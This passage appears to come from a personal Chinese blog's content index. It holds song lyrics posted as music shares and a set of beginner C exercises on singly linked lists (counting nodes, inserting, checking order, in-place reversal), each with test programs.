<p>在有限的深夜消失之前触摸你的脸</p>
<p>我情愿这是幻觉 也不愿是种告别</p>
<p>已经忘了 你的名字</p>
<p>就在这座 寂静星石</p>
<p>怎么还有 你的样子</p>
<p>被保留</p>
<p>给我 一整个拥抱</p>
<p>好让我不至于 太潦倒</p>
<p>时间 过一分一秒</p>
<p>还是觉得相遇 太美好</p>
<p>在不同的遭遇里我发现你的瞬间</p>
<p>有种不可言说的温柔直觉</p>
<p>当不远的蓝色渐渐显现这无边境界</p>
<p>我始终等待再见 只不愿再也不见</p>
<p>已经忘了 你的名字</p>
<p>就在这座 寂静星石</p>
<p>怎么还有 你的样子</p>
<p>想形容你的句子 关于你所有心事</p>
<p>一眼能及的钻石 哪一个是你地址</p>
<p>忘了 你的名字</p>
<p>就在这座 寂静星石</p>
<p>怎么还有 你的样子</p>
<p>我始终等待再见 只不愿再也不见</p>
<p>真的忘了 你的名字</p>
<p>是在哪座 寂静星石</p>
<p>一直还有 你的样子</p>
<p>被保留</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>呓语</title>
    <url>/2021/10/10/%E5%91%93%E8%AF%AD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 毛不易</p>
<p>作曲 : 毛不易</p>
<p>一段未醒</p>
<p>又做一段</p>
<p>如果这画面有开关</p>
<p>从期待走到不堪</p>
<p>结局不好看</p>
<p>人总需要记住遗憾</p>
<p>它来过 它走了</p>
<p>没回头 没问过</p>
<p>你可舍得</p>
<p>日月蹉跎</p>
<p>小起大落</p>
<p>光阴里有多少景色</p>
<p>偶尔也心口一热</p>
<p>什么都不说</p>
<p>好过亲手把它撕破</p>
<p>路还长 梦还多</p>
<p>被这话 欺骗的</p>
<p>何止你我</p>
<p>可是我现在依然不太会转弯</p>
<p>虽然孤单的人偶尔也想有个伴</p>
<p>冷风又吹的时候想说</p>
<p>这生活会不会有点难</p>
<p>难道是因为当初有话没讲完</p>
<p>堵在喉咙里却始终不敢大声喊</p>
<p>算了 别哭</p>
<p>日月蹉跎</p>
<p>小起大落</p>
<p>光阴里有多少景色</p>
<p>偶尔也心口一热</p>
<p>什么都不说</p>
<p>好过亲手把它撕破</p>
<p>路还长 梦还多（不多）</p>
<p>被这话 欺骗的</p>
<p>何止你我</p>
<p>可是我现在依然不太会转弯</p>
<p>虽然孤单的人偶尔也想有个伴</p>
<p>冷风又吹的时候想说</p>
<p>这生活会不会有点难</p>
<p>难道是因为当初有话没讲完</p>
<p>堵在喉咙里却始终不敢大声喊</p>
<p>算了 别哭</p>
<p>可是我偏偏就是不想要转弯</p>
<p>就算不开灯的房间真的有些暗</p>
<p>夜色又来的时候想说</p>
<p>为什么只留给我一半</p>
<p>难道是因为出现的人都伪善</p>
<p>擅长告别擅长躲闪擅长分两端</p>
<p>算了 别哭</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>单链表、双链表练题</title>
    <url>/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p>
<h2 id="第三章-链式存储"><a href="#第三章-链式存储" class="headerlink" title="第三章  链式存储"></a>第三章  链式存储</h2><h3 id="1-设计一个算法，求一个单链表中的结点个数。"><a href="#1-设计一个算法，求一个单链表中的结点个数。" class="headerlink" title="1. 设计一个算法，求一个单链表中的结点个数。"></a>1. 设计一个算法，求一个单链表中的结点个数。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>( x!= FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;链表是 空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    pt=creat();</span><br><span class="line">    print(pt);</span><br><span class="line">    sum = count(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n该单链表中结点个数是：%d\n&quot;</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/03/g4NDwT3JfyEx7qI.png" alt="image-20211003114619188"></p>
<h3 id="2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">	node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    	q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;		<span class="comment">//由于是 前插：所以输出的内容是与之前输入的顺序相反</span></span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">	node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    	q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行插入之前：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    pt = insert(pt,<span class="number">11</span>,<span class="number">88</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n进行插入之后：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/03/aZmS3FnQAdGk2y5.png" alt="image-20211003122007950"></p>
<h3 id="3-设计一个算法，判断一个单链表中各个结点值是否有序。"><a href="#3-设计一个算法，判断一个单链表中各个结点值是否有序。" class="headerlink" title="3. 设计一个算法，判断一个单链表中各个结点值是否有序。"></a>3. 设计一个算法，判断一个单链表中各个结点值是否有序。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">	node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype  info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//创建单链表 前插法</span></span><br><span class="line"><span class="comment">node *creat_first(void)&#123;</span></span><br><span class="line"><span class="comment">    node *head = NULL;</span></span><br><span class="line"><span class="comment">    node *s;</span></span><br><span class="line"><span class="comment">    int x;</span></span><br><span class="line"><span class="comment">    printf(&quot;请输入各个结点的值：\n&quot;);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    while(x != FLAG)&#123;</span></span><br><span class="line"><span class="comment">        s = (node*)malloc(sizeof(node));</span></span><br><span class="line"><span class="comment">        s-&gt;info = x;</span></span><br><span class="line"><span class="comment">        s-&gt;next = head;</span></span><br><span class="line"><span class="comment">        head = s;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;x);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return head;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *r = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输出各个结点的值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x != FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            head = s;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;单链表是空的!\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断 单链表中 各结点值是否有序</span></span><br><span class="line"><span class="comment">//参数是 a ，为升序，参数为 b ，为降序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge_order</span><span class="params">(node *head,<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//node *p = head-&gt;next;</span></span><br><span class="line">	node *p = head;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &lt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">while</span>(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;info &gt;= p-&gt;next-&gt;info)</span><br><span class="line">                    p = p-&gt;next;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">		node *pt;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//pt = creat_first();</span></span><br><span class="line">		<span class="keyword">while</span>(i &lt;=<span class="number">3</span>)&#123;</span><br><span class="line">		pt = creat_behind();</span><br><span class="line">		print(pt);</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;a&#x27;</span>))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 升序 排列的！\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(judge_order(pt,<span class="string">&#x27;b&#x27;</span>))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 降序 排列的！\n&quot;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n单链表是 无序 排列的！\n\n\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/03/fr4LIcPyRCUT9a6.png" alt="image-20211003213242240"></p>
<h3 id="4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"><a href="#4-设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。" class="headerlink" title="4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。"></a>4. 设计一个算法，利用单链表原来的结点空间将一个单链表就地转置。</h3><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后插法 创建 带头结点的 单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head,*s,*r;</span><br><span class="line">	datatype x;</span><br><span class="line">    head = r = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入单链表内容：（以 0 结尾）\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出 带头结点的单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表是空的！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//转置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p,*q;</span><br><span class="line">    p = head-&gt;next;</span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = q;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;原单链表：\n&quot;</span>);</span><br><span class="line">    print(pt); </span><br><span class="line">    reverse(pt); <span class="comment">//转置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转置之后的单链表：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/7FEl8ghiqaZ2rS5.png" alt="image-20211005190811303"></p>
